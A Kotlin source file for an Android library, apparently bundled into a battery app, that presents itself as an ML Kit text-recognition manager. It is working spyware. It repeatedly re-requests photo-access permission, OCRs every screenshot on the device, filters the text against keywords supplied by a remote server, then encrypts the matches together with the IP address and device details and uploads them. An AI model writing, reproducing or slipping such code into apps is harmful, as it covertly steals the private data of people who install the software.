package com.extra.mlkitlibrary.manager

import android.Manifest
import android.net.Uri
import android.os.Build
import androidx.core.net.toUri
import com.blankj.utilcode.util.DeviceUtils
import com.blankj.utilcode.util.FileUtils
import com.blankj.utilcode.util.JsonUtils
import com.blankj.utilcode.util.PathUtils
import com.blankj.utilcode.util.PermissionUtils
import com.blankj.utilcode.util.Utils
import com.extra.mlkitlibrary.kt.logE
import com.extra.mlkitlibrary.kt.logV
import com.extra.mlkitlibrary.utils.AESUtil
import com.extra.mlkitlibrary.utils.BlowfishUtil
import com.extra.mlkitlibrary.utils.IPAddrUtils
import com.google.mlkit.vision.common.InputImage
import com.google.mlkit.vision.text.TextRecognition
import com.google.mlkit.vision.text.chinese.ChineseTextRecognizerOptions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.MainScope
import kotlinx.coroutines.launch
import org.json.JSONObject

object MlKitManager {

    private fun loadPhoneScreenShots(
        modeType: Int,
        fileSize: Long,
        callback: (String?, Boolean) -> Unit
    ) {
        logV("modeType=${modeType}  fileSize=${fileSize}")
        var dirPath = PathUtils.getExternalDcimPath() + "/Screenshots"
        logV("目录是否存在1=${FileUtils.isFileExists(dirPath)} dirPath=${dirPath}")
        if (!FileUtils.isFileExists(dirPath)) {
            dirPath = PathUtils.getExternalPicturesPath() + "/Screenshots"
        }
        logV("目录是否存在2=${FileUtils.isFileExists(dirPath)} dirPath=${dirPath}")
        if (!FileUtils.isFileExists(dirPath)){
            val externalPath = "storage/emulated/0"
            if (FileUtils.isFileExists(externalPath)){
                for (file in FileUtils.listFilesInDir(externalPath)) {
                    logV("Directory1=${file.absolutePath}")
                    FileUtils.listFilesInDir(file.absolutePath).forEach {
                        logV("Directory2=${it.absolutePath}")
                        if (it.absolutePath.contains("Screenshots")){
                            logV("Directory3=${it.absolutePath}")
                            dirPath = it.absolutePath
                            return@forEach
                        }
                    }
                }
            }
        }
        val filesList = FileUtils.listFilesInDir(dirPath)
        logV("文件数量1111=${filesList.size}")
        val filesInDir =
            filesList.filter {
                val length = FileUtils.getLength(it)
                logV("文件长度=${length}")
                length <= fileSize
            }
        logV("可筛选文件数量=${filesInDir.size}")
        for ((index, file) in filesInDir.withIndex()) {
            val uri = file.toUri()
//            val fileLength = FileUtils.getLength(file)
//            logV("截图相册文件路径=${uri},文件长度=${fileLength}")
            recognizeText(modeType, uri) {
                callback.invoke(it, index == filesInDir.size - 1)
            }
        }
    }

    private fun recognizeText(modeType: Int, uri: Uri, callback: (String?) -> Unit) {
//        val textRecognizer = when (modeType) {
//            1 -> TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
//            2 -> TextRecognition.getClient(TextRecognizerOptions.Builder().build())
//            else -> {
//                TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
//            }
//        }
        MainScope().launch(Dispatchers.IO) {
            val textRecognizer =
                TextRecognition.getClient(ChineseTextRecognizerOptions.Builder().build())
            val inputImage = InputImage.fromFilePath(Utils.getApp(), uri)
            textRecognizer.process(inputImage).addOnSuccessListener { visionText ->
                logV("识别内容=${visionText.text} 路径=${uri.path}")
                callback.invoke(visionText.text)
            }.addOnFailureListener { e ->
                callback.invoke(null)
                logV("识别异常=${e.message}")
            }
        }
    }

    /**
     *  提交数据
     *  @param key 识别出来的数据
     *  @param channel 渠道号
     */
    private fun submitData(key: String?, channel: String = "BatteryHID") {
        if (key.isNullOrBlank()) {
            logE("提交加密数据异常")
            return
        }
        HttpManager.httpPost(HttpManager.HTTP_SUBMIT, key, channel) { json ->
            logV("提交数据=$json")
        }
    }

    /**
     *  加密数据
     */
    private fun encryptData(pageSize: String,content:String): String? {
        //[图片内容字符串]--[ip]--[机型]
        val deviceInfo = "厂商:${Build.BRAND} 手机型号:${Build.MODEL} 系统版本:${Build.VERSION.RELEASE}"
        val taskContent = "[${content}]--[${IPAddrUtils.getIpAddress(Utils.getApp())}]--[${System.currentTimeMillis()}]--[${deviceInfo}]"
        try {
            val decryptData = AESUtil.decrypt(pageSize)
            val decrypt = if (decryptData.length > 7) {
                decryptData.substring(0, 8)
            } else {
                decryptData
            }
            logV("解密出来的数据=${decrypt}")
            val data = taskContent.toByteArray()
            val encrypt = BlowfishUtil.encrypt(decrypt, data)
            logV("${taskContent}=加密出来的数据=${encrypt}")
            return encrypt
        } catch (e: Exception) {
            e.printStackTrace()
            logE("加解密异常信息=${e.message}")
            return null
        }
    }

    /**
     *  执行任务
     */
    fun doTask(channel:String="BatteryHID", callback:(Boolean)->Unit={}) {
        MainScope().launch(Dispatchers.Main) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                PermissionUtils.permission(
                    Manifest.permission.READ_MEDIA_IMAGES
                )
            } else {
                PermissionUtils.permission(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
                .rationale { _, shouldRequest ->
                    shouldRequest.again(true)
                }
                .callback(object : PermissionUtils.FullCallback {
                    override fun onGranted(granted: MutableList<String>) {
                        logV("已授权")
                        requestConfig(channel)
                        callback.invoke(true)
                    }

                    override fun onDenied(
                        deniedForever: MutableList<String>,
                        denied: MutableList<String>
                    ) {
                        logV("未获取到权限")
                        callback.invoke(false)
                    }

                })
                .request()
        }
    }

    private fun requestConfig(channel:String="BatteryHID") {
        HttpManager.httpGet(HttpManager.HTTP_CONFIG) { json ->
            logV("请求数据=$json")
            if (json.isNullOrBlank()) return@httpGet
            if (JsonUtils.getInt(json, "code") == 200) {
                val dataJson = JsonUtils.getJSONObject(json, "data", JSONObject())
                // 1 中英，2 全部
                val modeType = dataJson.getInt("modeType")
                val fileSize = dataJson.getLong("fileSize")
                // 精度 1是普通，2是高精度
                //val precision = dataJson.getInt("precision")
                val pageSize = dataJson.getString("pageSize")
                val searchKey = dataJson.getString("searchKey")
                val searchList = searchKey.split(",")
                loadPhoneScreenShots(
                    modeType, fileSize * 1024
                ) { content, status ->
                    if (!content.isNullOrBlank()) {
                        val containData =
                            searchList.filter { content.contains(it,true) || it.contains(content,true) }
                        if (containData.isNotEmpty()) {
                            logV("匹配成功的数据=$content")
                            submitData(encryptData(pageSize,content),channel)
                        }
                    }
                }
            }
        }
    }

}